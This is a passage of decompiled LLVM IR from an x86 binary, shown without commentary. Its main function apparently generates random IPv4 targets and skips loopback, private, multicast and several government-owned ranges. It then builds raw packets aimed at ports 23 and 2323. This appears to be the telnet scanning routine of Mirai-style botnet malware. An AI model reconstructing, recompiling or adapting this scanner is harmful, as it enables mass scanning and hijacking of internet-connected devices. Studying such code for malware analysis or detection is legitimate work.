  store i32 %v4_804de51, i32* %v3_804de59, align 4
  %v8_804de5c = icmp eq i32 %v4_804de51, -1
  br i1 %v8_804de5c, label %dec_label_pc_804ded3, label %dec_label_pc_804de5f

dec_label_pc_804de5f:                             ; preds = %dec_label_pc_804de4a
  %v0_804de61 = load i32, i32* @ebx, align 4
  %v1_804de61 = add i32 %v0_804de61, 28
  store i32 %v1_804de61, i32* @eax, align 4
  %v1_804de69 = add i32 %v0_804de61, 24
  %v2_804de69 = inttoptr i32 %v1_804de69 to i32*
  store i32 0, i32* %v2_804de69, align 4
  %v0_804de70 = load i32, i32* @eax, align 4
  %v2_804de71 = call i32 @function_804fdc0(i32 %v0_804de70, i32 256)
  %v0_804de79 = load i32, i32* @ebx, align 4
  %v1_804de79 = add i32 %v0_804de79, 4
  %v2_804de79 = inttoptr i32 %v1_804de79 to i32*
  %v3_804de79 = load i32, i32* %v2_804de79, align 4
  %v3_804de81 = call i32 @function_80501bd(i32 %v3_804de79, i32 3, i32 0)
  %v0_804de89 = load i32, i32* @ebx, align 4
  %v1_804de89 = add i32 %v0_804de89, 4
  %v2_804de89 = inttoptr i32 %v1_804de89 to i32*
  %v3_804de89 = load i32, i32* %v2_804de89, align 4
  %v12_804de8c = or i32 %v3_804de81, 2048
  %v3_804de93 = call i32 @function_80501bd(i32 %v3_804de89, i32 4, i32 %v12_804de8c)
  %v0_804de98 = load i32, i32* @ebx, align 4
  store i32 2, i32* %stack_var_-20, align 4
  %v0_804deae = load i32, i32* @global_var_80543f0.9, align 16
  %v2_804deb3 = add i32 %v0_804de98, 8
  %v3_804deb3 = inttoptr i32 %v2_804deb3 to i32*
  store i32 %v0_804deae, i32* %v3_804deb3, align 4
  %v2_804deb6 = ptrtoint i32* %stack_var_-20 to i32
  %v0_804debd = load i32, i32* @ebx, align 4
  %v1_804debd = add i32 %v0_804debd, 4
  %v2_804debd = inttoptr i32 %v1_804debd to i32*
  %v3_804debd = load i32, i32* %v2_804debd, align 4
  store i32 %v3_804debd, i32* %edx.global-to-local, align 4
  %v1_804dec0 = add i32 %v0_804debd, 12
  %v2_804dec0 = inttoptr i32 %v1_804dec0 to i32*
  store i32 1, i32* %v2_804dec0, align 4
  %v0_804deca = load i32, i32* %edx.global-to-local, align 4
  %v3_804decb = call i32 @function_805085c(i32 %v0_804deca, i32 %v2_804deb6, i32 16)
  br label %dec_label_pc_804ded3

dec_label_pc_804ded3:                             ; preds = %dec_label_pc_804de4a, %dec_label_pc_804de5f
  %v0_804ded7 = phi i32 [ %v3_804decb, %dec_label_pc_804de5f ], [ 0, %dec_label_pc_804de4a ]
  store i32 %v0_804de10, i32* @ebx, align 4
  ret i32 %v0_804ded7

; uselistorder directives
  uselistorder i32 %v3_804de36, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ded3, { 1, 0 }
  uselistorder label %dec_label_pc_804de4a, { 1, 0 }
}

define i32 @function_804e2fe() local_unnamed_addr {
dec_label_pc_804e2fe:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_804e8fd, %dec_label_pc_804e2fe
  %v0_804e2fe = load i32, i32* @global_var_80543f0.9, align 16
  store i32 %v0_804e2fe, i32* @esi, align 4
  %v0_804e304 = load i32, i32* @esp, align 4
  %v1_804e304 = add i32 %v0_804e304, 24
  %v2_804e304 = inttoptr i32 %v1_804e304 to i32*
  %v3_804e304 = load i32, i32* %v2_804e304, align 4
  %v15_804e304 = icmp eq i32 %v3_804e304, %v0_804e2fe
  br i1 %v15_804e304, label %dec_label_pc_804e64b, label %dec_label_pc_804e30e

dec_label_pc_804e30e:                             ; preds = %.loopexit
  %v1_804e30e = add i32 %v0_804e304, 1828
  store i32 %v1_804e30e, i32* @ebp, align 4
  %v1_804e315 = add i32 %v0_804e304, 1868
  %v2_804e315 = inttoptr i32 %v1_804e315 to i32*
  store i32 0, i32* %v2_804e315, align 4
  %v0_804e510.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e510

dec_label_pc_804e325:                             ; preds = %dec_label_pc_804e584
  switch i8 %v2_804e567, label %dec_label_pc_804e340 [
    i8 -84, label %dec_label_pc_804e5d0
    i8 100, label %dec_label_pc_804e32e.dec_label_pc_804e59b_crit_edge
    i8 -87, label %dec_label_pc_804e5eb
  ]

dec_label_pc_804e32e.dec_label_pc_804e59b_crit_edge: ; preds = %dec_label_pc_804e325
  %.pre = trunc i32 %v2_804e55e to i8
  br label %dec_label_pc_804e59b

dec_label_pc_804e337:                             ; preds = %dec_label_pc_804e592
  %v11_804e337 = icmp eq i8 %v2_804e567, -87
  br i1 %v11_804e337, label %dec_label_pc_804e5eb, label %dec_label_pc_804e340

dec_label_pc_804e340:                             ; preds = %dec_label_pc_804e325, %dec_label_pc_804e5e2, %dec_label_pc_804e337
  %v0_804e340 = phi i32 [ %v0_804e5e2, %dec_label_pc_804e5e2 ], [ %v5_804e55c, %dec_label_pc_804e337 ], [ %v5_804e55c, %dec_label_pc_804e325 ]
  %v0_804e35758 = phi i32 [ %v0_804e5d9, %dec_label_pc_804e5e2 ], [ %v2_804e55e, %dec_label_pc_804e337 ], [ %v2_804e55e, %dec_label_pc_804e325 ]
  %v1_804e340 = trunc i32 %v0_804e340 to i8
  %v11_804e340 = icmp eq i8 %v1_804e340, -58
  br i1 %v11_804e340, label %dec_label_pc_804e5b2, label %dec_label_pc_804e349

dec_label_pc_804e349:                             ; preds = %dec_label_pc_804e5eb, %dec_label_pc_804e5a9, %dec_label_pc_804e340
  %v0_804e349 = phi i32 [ %v0_804e34965, %dec_label_pc_804e5eb ], [ %v5_804e55c, %dec_label_pc_804e5a9 ], [ %v0_804e340, %dec_label_pc_804e340 ]
  %v0_804e35757 = phi i32 [ %v0_804e5eb, %dec_label_pc_804e5eb ], [ %v2_804e55e, %dec_label_pc_804e5a9 ], [ %v0_804e35758, %dec_label_pc_804e340 ]
  %v1_804e349 = trunc i32 %v0_804e349 to i8
  %tmp252 = icmp ult i8 %v1_804e349, -32
  br i1 %tmp252, label %dec_label_pc_804e352, label %dec_label_pc_804e551.preheader

dec_label_pc_804e352:                             ; preds = %dec_label_pc_804e59b, %dec_label_pc_804e5b2, %dec_label_pc_804e5d0.dec_label_pc_804e352_crit_edge, %dec_label_pc_804e349
  %v0_804e415 = phi i32 [ %v0_804e5d9, %dec_label_pc_804e5d0.dec_label_pc_804e352_crit_edge ], [ %v0_804e35757, %dec_label_pc_804e349 ], [ %v0_804e5bb, %dec_label_pc_804e5b2 ], [ %v2_804e55e, %dec_label_pc_804e59b ]
  %v0_804e423 = phi i32 [ %v0_804e352.pre, %dec_label_pc_804e5d0.dec_label_pc_804e352_crit_edge ], [ %v0_804e349, %dec_label_pc_804e349 ], [ %v0_804e35254, %dec_label_pc_804e5b2 ], [ %v5_804e55c, %dec_label_pc_804e59b ]
  %v1_804e352 = trunc i32 %v0_804e423 to i8
  %v10_804e352 = icmp eq i8 %v1_804e352, 106
  %tmp253 = and i32 %v0_804e415, 252
  %switch = icmp eq i32 %tmp253, 184
  %or.cond153 = and i1 %switch, %v10_804e352
  br i1 %or.cond153, label %dec_label_pc_804e551.preheader, label %dec_label_pc_804e37b

dec_label_pc_804e37b:                             ; preds = %dec_label_pc_804e352
  switch i8 %v1_804e352, label %dec_label_pc_804e39f [
    i8 -106, label %dec_label_pc_804e5f9
    i8 49, label %dec_label_pc_804e619
    i8 -78, label %dec_label_pc_804e60b
    i8 -96, label %dec_label_pc_804e62b
  ]

dec_label_pc_804e39f:                             ; preds = %dec_label_pc_804e619, %dec_label_pc_804e5f9, %dec_label_pc_804e37b, %dec_label_pc_804e62b, %dec_label_pc_804e60b
  %v1_804e39f = add i32 %v0_804e423, -6
  store i32 %v1_804e39f, i32* %eax.global-to-local, align 4
  %v1_804e3a2 = trunc i32 %v1_804e39f to i8
  %tmp254 = or i8 %v1_804e3a2, 1
  %tmp255 = icmp eq i8 %tmp254, 1
  br i1 %tmp255, label %dec_label_pc_804e551.preheader, label %switch.early.test

switch.early.test:                                ; preds = %dec_label_pc_804e39f
  switch i8 %v1_804e352, label %dec_label_pc_804e40d [
    i8 -41, label %dec_label_pc_804e551.preheader
    i8 -42, label %dec_label_pc_804e551.preheader
    i8 55, label %dec_label_pc_804e551.preheader
    i8 33, label %dec_label_pc_804e551.preheader
    i8 30, label %dec_label_pc_804e551.preheader
    i8 29, label %dec_label_pc_804e551.preheader
    i8 28, label %dec_label_pc_804e551.preheader
    i8 26, label %dec_label_pc_804e551.preheader
    i8 22, label %dec_label_pc_804e551.preheader
    i8 21, label %dec_label_pc_804e551.preheader
    i8 11, label %dec_label_pc_804e551.preheader
  ]

dec_label_pc_804e40d:                             ; preds = %switch.early.test
  %v0_804e40f = load i32, i32* @edx, align 4
  store i16 0, i16* bitcast (i32* @global_var_80543ca.10 to i16*), align 4
  %v1_804e415 = mul i32 %v0_804e415, 65536
  %v2_804e420 = and i32 %v1_804e415, 16711680
  %v2_804e423 = mul i32 %v0_804e423, 16777216
  %v1_804e40f = mul i32 %v0_804e40f, 256
  %v2_804e429 = or i32 %v2_804e420, %v2_804e423
  %v0_804e42b = load i32, i32* @edi, align 4
  %v1_804e42d = urem i32 %v0_804e42b, 256
  store i32 %v1_804e42d, i32* %eax.global-to-local, align 4
  %v2_804e432 = or i32 %v1_804e42d, %v2_804e429
  store i32 %v2_804e432, i32* %ecx.global-to-local, align 4
  %v2_804e434 = or i32 %v1_804e42d, %v1_804e40f
  %v1_804e436 = load i32, i32* @esp, align 4
  %v2_804e436 = add i32 %v1_804e436, -4
  %v3_804e436 = inttoptr i32 %v2_804e436 to i32*
  store i32 %v2_804e432, i32* %v3_804e436, align 4
  %v1_804e437 = trunc i32 %v2_804e434 to i16
  %v2_804e437 = call i16 @llvm.bswap.i16(i16 %v1_804e437)
  %v3_804e437 = zext i16 %v2_804e437 to i32
  %v1_804e43b = udiv i32 %v2_804e429, 65536
  %v2_804e43b = mul nuw i32 %v3_804e437, 65536
  %v1_804e43e = trunc i32 %v1_804e43b to i16
  %v2_804e43e = call i16 @llvm.bswap.i16(i16 %v1_804e43e)
  %v3_804e43e = zext i16 %v2_804e43e to i32
  %v6_804e43e = or i32 %v2_804e43b, %v3_804e43e
  store i32 %v6_804e43e, i32* %edx.global-to-local, align 4
  %v0_804e442 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804e442 = add i32 %v1_804e436, -8
  %v3_804e442 = inttoptr i32 %v2_804e442 to i32*
  store i32 %v0_804e442, i32* %v3_804e442, align 4
  %v0_804e443 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804e443, i32* @global_var_80543d0.11, align 16
  %v1_804e449 = add i32 %v1_804e436, -12
  %v2_804e449 = inttoptr i32 %v1_804e449 to i32*
  store i32 20, i32* %v2_804e449, align 4
  %v1_804e44b = add i32 %v1_804e436, -16
  %v2_804e44b = inttoptr i32 %v1_804e44b to i32*
  store i32 ptrtoint (i32* @global_var_80543c0.12 to i32), i32* %v2_804e44b, align 4
  %v0_804e450 = call i32 @function_804bd90()
  %v1_804e450 = trunc i32 %v0_804e450 to i16
  store i32 %v0_804e450, i32* %eax.global-to-local, align 4
  %v0_804e455 = load i32, i32* @esp, align 4
  %v1_804e455 = add i32 %v0_804e455, 1884
  %v2_804e455 = inttoptr i32 %v1_804e455 to i32*
  %v3_804e455 = load i32, i32* %v2_804e455, align 4
  store i16 %v1_804e450, i16* bitcast (i32* @global_var_80543ca.10 to i16*), align 4
  store i32 10, i32* %ecx.global-to-local, align 4
  %v2_804e46b = ashr i32 %v3_804e455, 31
  %v2_804e471 = zext i32 %v3_804e455 to i64
  %v4_804e471 = zext i32 %v2_804e46b to i64
  %v5_804e471 = mul nuw i64 %v4_804e471, 4294967296
  %v6_804e471 = or i64 %v5_804e471, %v2_804e471
  %v10_804e471 = srem i64 %v6_804e471, 10
  %v11_804e471 = trunc i64 %v10_804e471 to i32
  store i32 %v11_804e471, i32* %edx.global-to-local, align 4
  %v1_804e473 = icmp eq i32 %v11_804e471, 0
  %v1_804e475 = icmp eq i1 %v1_804e473, false
  %. = select i1 %v1_804e475, i16 5888, i16 4873
  store i16 %., i16* @global_var_80543d6.13, align 2
  %v0_804e484 = load i32, i32* @global_var_80543d0.11, align 16
  store i32 %v0_804e484, i32* %eax.global-to-local, align 4
  %v1_804e489 = add i32 %v0_804e455, 12
  %v2_804e489 = inttoptr i32 %v1_804e489 to i32*
  store i32 20, i32* %v2_804e489, align 4
  %v0_804e48b = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804e48b, i32* @global_var_80543d8.14, align 8
  %v1_804e490 = add i32 %v0_804e455, 8
  %v2_804e490 = inttoptr i32 %v1_804e490 to i32*
  store i32 5120, i32* %v2_804e490, align 4
  store i16 0, i16* bitcast (i32* @global_var_80543e4.15 to i16*), align 4
  %v1_804e49e = add i32 %v0_804e455, 4
  %v2_804e49e = inttoptr i32 %v1_804e49e to i32*
  store i32 ptrtoint (i32* @global_var_80543d4.16 to i32), i32* %v2_804e49e, align 4
  %v2_804e4a3 = inttoptr i32 %v0_804e455 to i32*
  store i32 ptrtoint (i32* @global_var_80543c0.12 to i32), i32* %v2_804e4a3, align 4
  %v0_804e4a8 = call i32 @function_804bde0()
  %v1_804e4a8 = trunc i32 %v0_804e4a8 to i16
  store i16 %v1_804e4a8, i16* bitcast (i32* @global_var_80543e4.15 to i16*), align 4
  %v0_804e4b3 = load i32, i32* @global_var_80543d0.11, align 16
  store i32 %v0_804e4b3, i32* %eax.global-to-local, align 4
  %v1_804e4b8 = load i32, i32* @esp, align 4
  %v2_804e4b8 = add i32 %v1_804e4b8, 1848
  %v3_804e4b8 = inttoptr i32 %v2_804e4b8 to i32*
  store i32 %v0_804e4b3, i32* %v3_804e4b8, align 4
  %v0_804e4bf = load i16, i16* @global_var_80543d6.13, align 2
  %v1_804e4bf = zext i16 %v0_804e4bf to i32
  %v2_804e4bf = load i32, i32* %eax.global-to-local, align 4
  %v3_804e4bf = and i32 %v2_804e4bf, -65536
  %v4_804e4bf = or i32 %v3_804e4bf, %v1_804e4bf
  store i32 %v4_804e4bf, i32* %eax.global-to-local, align 4
  %v0_804e4c5 = load i32, i32* @esp, align 4
  %v1_804e4c5 = add i32 %v0_804e4c5, 1844
  %v2_804e4c5 = inttoptr i32 %v1_804e4c5 to i16*
  store i16 2, i16* %v2_804e4c5, align 2
  %v0_804e4cf = load i32, i32* %eax.global-to-local, align 4
  %v1_804e4cf = trunc i32 %v0_804e4cf to i16
  %v2_804e4cf = load i32, i32* @esp, align 4
  %v3_804e4cf = add i32 %v2_804e4cf, 1846
  %v4_804e4cf = inttoptr i32 %v3_804e4cf to i16*
  store i16 %v1_804e4cf, i16* %v4_804e4cf, align 2
  %v0_804e4d7 = load i32, i32* @esp, align 4
  %v1_804e4d7 = inttoptr i32 %v0_804e4d7 to i32*
  %v3_804e4d7 = add i32 %v0_804e4d7, 4
  %v0_804e4d8 = load i32, i32* @global_var_805443c.17, align 4
  store i32 %v0_804e4d8, i32* %eax.global-to-local, align 4
  %v1_804e4dd = inttoptr i32 %v3_804e4d7 to i32*
  %v2_804e4dd = load i32, i32* %v1_804e4dd, align 4
  store i32 %v2_804e4dd, i32* %edx.global-to-local, align 4
  store i32 16, i32* %v1_804e4dd, align 4
  %v0_804e4e0 = load i32, i32* @ebp, align 4
  store i32 %v0_804e4e0, i32* %v1_804e4d7, align 4
  %v1_804e4e1 = add i32 %v0_804e4d7, -4
  %v2_804e4e1 = inttoptr i32 %v1_804e4e1 to i32*
  store i32 16384, i32* %v2_804e4e1, align 4
  %v1_804e4e6 = add i32 %v0_804e4d7, -8
  %v2_804e4e6 = inttoptr i32 %v1_804e4e6 to i32*
  store i32 40, i32* %v2_804e4e6, align 4
  %v1_804e4e8 = add i32 %v0_804e4d7, -12
  %v2_804e4e8 = inttoptr i32 %v1_804e4e8 to i32*
  store i32 ptrtoint (i32* @global_var_80543c0.12 to i32), i32* %v2_804e4e8, align 4
  %v0_804e4ed = load i32, i32* %eax.global-to-local, align 4
  %v2_804e4ed = add i32 %v0_804e4d7, -16
  %v3_804e4ed = inttoptr i32 %v2_804e4ed to i32*
  store i32 %v0_804e4ed, i32* %v3_804e4ed, align 4
  %v0_804e4ee = call i32 @function_80509b9()
  store i32 %v0_804e4ee, i32* %eax.global-to-local, align 4
  %v0_804e4f3 = load i32, i32* @esp, align 4
  %v1_804e4f3 = add i32 %v0_804e4f3, 1900
  %v2_804e4f3 = inttoptr i32 %v1_804e4f3 to i32*
  %v3_804e4f3 = load i32, i32* %v2_804e4f3, align 4
  %v1_804e4fa = add i32 %v3_804e4f3, 1
  store i32 %v1_804e4fa, i32* %eax.global-to-local, align 4
  store i32 %v1_804e4fa, i32* %v2_804e4f3, align 4
  %v0_804e502 = load i32, i32* @esp, align 4
  %v1_804e502 = add i32 %v0_804e502, 32
  %v0_804e505 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e505 = add i32 %v0_804e505, -383
  %v6_804e505 = sub i32 382, %v0_804e505
  %v7_804e505 = and i32 %v6_804e505, %v0_804e505
  %v8_804e505 = icmp slt i32 %v7_804e505, 0
  %v9_804e505 = icmp eq i32 %v1_804e505, 0
  %v10_804e505 = icmp slt i32 %v1_804e505, 0
  %v3_804e50a = icmp eq i1 %v10_804e505, %v8_804e505
  %v4_804e50a = icmp eq i1 %v9_804e505, false
  %v5_804e50a = and i1 %v4_804e50a, %v3_804e50a
  br i1 %v5_804e50a, label %dec_label_pc_804e647, label %dec_label_pc_804e510

dec_label_pc_804e510:                             ; preds = %dec_label_pc_804e40d, %dec_label_pc_804e30e
  %v0_804e510 = phi i32 [ %v1_804e502, %dec_label_pc_804e40d ], [ %v0_804e510.pre, %dec_label_pc_804e30e ]
  %v1_804e510 = add i32 %v0_804e510, 1828
  %v2_804e510 = inttoptr i32 %v1_804e510 to i32*
  store i32 0, i32* %v2_804e510, align 4
  %v0_804e51b = load i32, i32* @esp, align 4
  %v1_804e51b = add i32 %v0_804e51b, 1832
  %v2_804e51b = inttoptr i32 %v1_804e51b to i32*
  store i32 0, i32* %v2_804e51b, align 4
  %v0_804e526 = load i32, i32* @esp, align 4
  %v1_804e526 = add i32 %v0_804e526, 1836
  %v2_804e526 = inttoptr i32 %v1_804e526 to i32*
  store i32 0, i32* %v2_804e526, align 4
  %v0_804e531 = load i32, i32* @esp, align 4
  %v1_804e531 = add i32 %v0_804e531, 1840
  %v2_804e531 = inttoptr i32 %v1_804e531 to i32*
  store i32 0, i32* %v2_804e531, align 4
  %v1_804e53c = call i32 @function_804d700(i32 ptrtoint (i32* @0 to i32))
  %v2_804e53c = trunc i32 %v1_804e53c to i16
  store i16 %v2_804e53c, i16* bitcast (i32* @global_var_80543c4.18 to i16*), align 4
  %v0_804e547 = load i32, i32* @global_var_805441c.19, align 4
  store i32 %v0_804e547, i32* %eax.global-to-local, align 4
  store i32 %v0_804e547, i32* @global_var_80543cc.20, align 4
  br label %dec_label_pc_804e551.preheader

dec_label_pc_804e551.preheader:                   ; preds = %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %dec_label_pc_804e39f, %dec_label_pc_804e352, %dec_label_pc_804e5b2, %dec_label_pc_804e510, %dec_label_pc_804e5d9, %dec_label_pc_804e5f9, %dec_label_pc_804e619, %dec_label_pc_804e349, %dec_label_pc_804e5eb, %dec_label_pc_804e60b, %dec_label_pc_804e62b
  br label %dec_label_pc_804e551

dec_label_pc_804e551:                             ; preds = %switch.early.test251, %switch.early.test251, %dec_label_pc_804e573, %dec_label_pc_804e551, %dec_label_pc_804e551, %dec_label_pc_804e551, %dec_label_pc_804e5a4, %dec_label_pc_804e58d, %dec_label_pc_804e551.preheader
  %v1_804e551 = call i32 @function_804d700(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e551, i32* %eax.global-to-local, align 4
  %sext = mul i32 %v1_804e551, 65536
  %v1_804e556 = sdiv i32 %sext, 65536
  %v2_804e55c = urem i32 %v1_804e551, 256
  %v3_804e55c = load i32, i32* @ecx, align 4
  %v4_804e55c = and i32 %v3_804e55c, -256
  %v5_804e55c = or i32 %v4_804e55c, %v2_804e55c
  store i32 %v5_804e55c, i32* @ecx, align 4
  %v2_804e55e = udiv i32 %v1_804e556, 256
  store i32 %v2_804e55e, i32* @ebx, align 4
  %v2_804e561 = udiv i32 %v1_804e556, 65536
  store i32 %v2_804e561, i32* @edx, align 4
  %v2_804e564 = udiv i32 %v1_804e556, 16777216
  store i32 %v2_804e564, i32* @edi, align 4
  %v2_804e567 = trunc i32 %v1_804e551 to i8
  switch i8 %v2_804e567, label %dec_label_pc_804e573 [
    i8 127, label %dec_label_pc_804e551
    i8 0, label %dec_label_pc_804e551
    i8 3, label %dec_label_pc_804e551
  ]

dec_label_pc_804e573:                             ; preds = %dec_label_pc_804e551
  %v2_804e573 = add nsw i32 %v1_804e556, -15
  store i32 %v2_804e573, i32* %eax.global-to-local, align 4
  %v1_804e576 = trunc i32 %v2_804e573 to i8
  %tmp256 = or i8 %v1_804e576, 1
  %tmp257 = icmp eq i8 %tmp256, 1
  br i1 %tmp257, label %dec_label_pc_804e551, label %switch.early.test251

switch.early.test251:                             ; preds = %dec_label_pc_804e573
  switch i8 %v2_804e567, label %dec_label_pc_804e584 [
    i8 56, label %dec_label_pc_804e551
    i8 10, label %dec_label_pc_804e551
  ]

dec_label_pc_804e584:                             ; preds = %switch.early.test251
  %v8_804e584 = icmp eq i8 %v2_804e567, -64
  %v1_804e587 = icmp eq i1 %v8_804e584, false
  br i1 %v1_804e587, label %dec_label_pc_804e325, label %dec_label_pc_804e58d

dec_label_pc_804e58d:                             ; preds = %dec_label_pc_804e584
  %v1_804e58d = trunc i32 %v2_804e55e to i8
  %v11_804e58d = icmp eq i8 %v1_804e58d, -88
  br i1 %v11_804e58d, label %dec_label_pc_804e551, label %dec_label_pc_804e592

dec_label_pc_804e592:                             ; preds = %dec_label_pc_804e58d
  %v10_804e592 = icmp eq i8 %v2_804e567, 100
  %v1_804e595 = icmp eq i1 %v10_804e592, false
  br i1 %v1_804e595, label %dec_label_pc_804e337, label %dec_label_pc_804e59b

dec_label_pc_804e59b:                             ; preds = %dec_label_pc_804e32e.dec_label_pc_804e59b_crit_edge, %dec_label_pc_804e592
  %v1_804e59b.pre-phi = phi i8 [ %.pre, %dec_label_pc_804e32e.dec_label_pc_804e59b_crit_edge ], [ %v1_804e58d, %dec_label_pc_804e592 ]
  %tmp258 = icmp ult i8 %v1_804e59b.pre-phi, 64
  br i1 %tmp258, label %dec_label_pc_804e352, label %dec_label_pc_804e5a4

dec_label_pc_804e5a4:                             ; preds = %dec_label_pc_804e59b
  %tmp259 = icmp ult i8 %v1_804e59b.pre-phi, 127
  br i1 %tmp259, label %dec_label_pc_804e551, label %dec_label_pc_804e5a9

dec_label_pc_804e5a9:                             ; preds = %dec_label_pc_804e5a4
  %v11_804e5a9 = icmp eq i8 %v2_804e567, -58
  %v1_804e5ac = icmp eq i1 %v11_804e5a9, false
  br i1 %v1_804e5ac, label %dec_label_pc_804e349, label %dec_label_pc_804e5b2

dec_label_pc_804e5b2:                             ; preds = %dec_label_pc_804e5a9, %dec_label_pc_804e340
  %v0_804e5bb = phi i32 [ %v2_804e55e, %dec_label_pc_804e5a9 ], [ %v0_804e35758, %dec_label_pc_804e340 ]
  %v0_804e35254 = phi i32 [ %v5_804e55c, %dec_label_pc_804e5a9 ], [ %v0_804e340, %dec_label_pc_804e340 ]
  %v1_804e5b2 = trunc i32 %v0_804e5bb to i8
  %tmp260 = icmp ugt i8 %v1_804e5b2, 17
  %tmp261 = or i8 %v1_804e5b2, 1
  %tmp262 = icmp eq i8 %tmp261, 19
  %or.cond140 = and i1 %tmp260, %tmp262
  br i1 %or.cond140, label %dec_label_pc_804e551.preheader, label %dec_label_pc_804e352

dec_label_pc_804e5c5:                             ; preds = %dec_label_pc_804f50a
  store i32 0, i32* %v2_804e5c8, align 4
  %v1_804e5ca = call i32 @function_8051d73(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e5ca, i32* %eax.global-to-local, align 4
  %v0_804e5d0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e5d0

dec_label_pc_804e5d0:                             ; preds = %dec_label_pc_804e325, %dec_label_pc_804e5c5
  %v0_804e5d9 = phi i32 [ %v0_804e5d0.pre, %dec_label_pc_804e5c5 ], [ %v2_804e55e, %dec_label_pc_804e325 ]
  %v1_804e5d0 = trunc i32 %v0_804e5d9 to i8
  %tmp263 = icmp ult i8 %v1_804e5d0, 16
  br i1 %tmp263, label %dec_label_pc_804e5d0.dec_label_pc_804e352_crit_edge, label %dec_label_pc_804e5d9

dec_label_pc_804e5d0.dec_label_pc_804e352_crit_edge: ; preds = %dec_label_pc_804e5d0
  %v0_804e352.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e352

dec_label_pc_804e5d9:                             ; preds = %dec_label_pc_804e5d0
  %tmp264 = icmp ult i8 %v1_804e5d0, 32
  br i1 %tmp264, label %dec_label_pc_804e551.preheader, label %dec_label_pc_804e5e2

dec_label_pc_804e5e2:                             ; preds = %dec_label_pc_804e5d9
  %v0_804e5e2 = load i32, i32* @ecx, align 4
  %v1_804e5e2 = trunc i32 %v0_804e5e2 to i8
  %v11_804e5e2 = icmp eq i8 %v1_804e5e2, -87
  %v1_804e5e5 = icmp eq i1 %v11_804e5e2, false
  br i1 %v1_804e5e5, label %dec_label_pc_804e340, label %dec_label_pc_804e5eb

dec_label_pc_804e5eb:                             ; preds = %dec_label_pc_804e325, %dec_label_pc_804e5e2, %dec_label_pc_804e337
  %v0_804e34965 = phi i32 [ %v0_804e5e2, %dec_label_pc_804e5e2 ], [ %v5_804e55c, %dec_label_pc_804e337 ], [ %v5_804e55c, %dec_label_pc_804e325 ]
  %v0_804e5eb = phi i32 [ %v0_804e5d9, %dec_label_pc_804e5e2 ], [ %v2_804e55e, %dec_label_pc_804e337 ], [ %v2_804e55e, %dec_label_pc_804e325 ]
  %v1_804e5eb = trunc i32 %v0_804e5eb to i8
  %v11_804e5eb = icmp eq i8 %v1_804e5eb, -1
  %v1_804e5ee = icmp eq i1 %v11_804e5eb, false
  br i1 %v1_804e5ee, label %dec_label_pc_804e349, label %dec_label_pc_804e551.preheader

dec_label_pc_804e5f9:                             ; preds = %dec_label_pc_804e37b
  %v1_804e5f9 = trunc i32 %v0_804e415 to i8
  %v10_804e5f9 = icmp eq i8 %v1_804e5f9, 31
  br i1 %v10_804e5f9, label %dec_label_pc_804e551.preheader, label %dec_label_pc_804e39f

dec_label_pc_804e60b:                             ; preds = %dec_label_pc_804e37b
  %.pre105 = trunc i32 %v0_804e415 to i8
  %v10_804e60b = icmp eq i8 %.pre105, 62
  %v1_804e60e = icmp eq i1 %v10_804e60b, false
  br i1 %v1_804e60e, label %dec_label_pc_804e39f, label %dec_label_pc_804e551.preheader

dec_label_pc_804e619:                             ; preds = %dec_label_pc_804e37b
  %v1_804e619 = trunc i32 %v0_804e415 to i8
  %v10_804e619 = icmp eq i8 %v1_804e619, 51
  br i1 %v10_804e619, label %dec_label_pc_804e551.preheader, label %dec_label_pc_804e39f

dec_label_pc_804e62b:                             ; preds = %dec_label_pc_804e37b
  %.pre104 = trunc i32 %v0_804e415 to i8
  %v10_804e62b = icmp eq i8 %.pre104, 13
  %v1_804e62e = icmp eq i1 %v10_804e62b, false
  br i1 %v1_804e62e, label %dec_label_pc_804e39f, label %dec_label_pc_804e551.preheader

dec_label_pc_804e647:                             ; preds = %dec_label_pc_804e40d
  %v0_804e647 = load i32, i32* @esi, align 4
  %v2_804e647 = add i32 %v0_804e502, 56
  %v3_804e647 = inttoptr i32 %v2_804e647 to i32*
  store i32 %v0_804e647, i32* %v3_804e647, align 4
  br label %dec_label_pc_804e64b

dec_label_pc_804e64b:                             ; preds = %.loopexit, %dec_label_pc_804e647
  %v1_804e64b = call i32 @function_805078b(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804e64b, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_804e652 = load i32, i32* @esp, align 4
  %v2_804e652 = add i32 %v1_804e652, 40
  %v3_804e652 = inttoptr i32 %v2_804e652 to i32*
  store i32 %v1_804e64b, i32* %v3_804e652, align 4
  br label %dec_label_pc_804e656

dec_label_pc_804e656:                             ; preds = %dec_label_pc_804e6b1, %dec_label_pc_804e6f3, %dec_label_pc_804e6eb, %dec_label_pc_804e6e3, %dec_label_pc_804e6cf, %dec_label_pc_804e6c3, %dec_label_pc_804e6aa, %dec_label_pc_804e69e, %dec_label_pc_804e699, %dec_label_pc_804e755, %dec_label_pc_804e64b
  %v0_804e656 = load i32, i32* @esp, align 4
  %v1_804e656 = add i32 %v0_804e656, 40
  %v2_804e656 = inttoptr i32 %v1_804e656 to i32*
  %v3_804e656 = load i32, i32* %v2_804e656, align 4
  store i32 %v3_804e656, i32* %eax.global-to-local, align 4
  %v1_804e65a = inttoptr i32 %v3_804e656 to i32*
  store i32 0, i32* %v1_804e65a, align 4
  %v0_804e660 = load i32, i32* @edi, align 4
  %v1_804e660 = load i32, i32* @esp, align 4
  %v2_804e660 = add i32 %v1_804e660, -4
  %v3_804e660 = inttoptr i32 %v2_804e660 to i32*
  store i32 %v0_804e660, i32* %v3_804e660, align 4
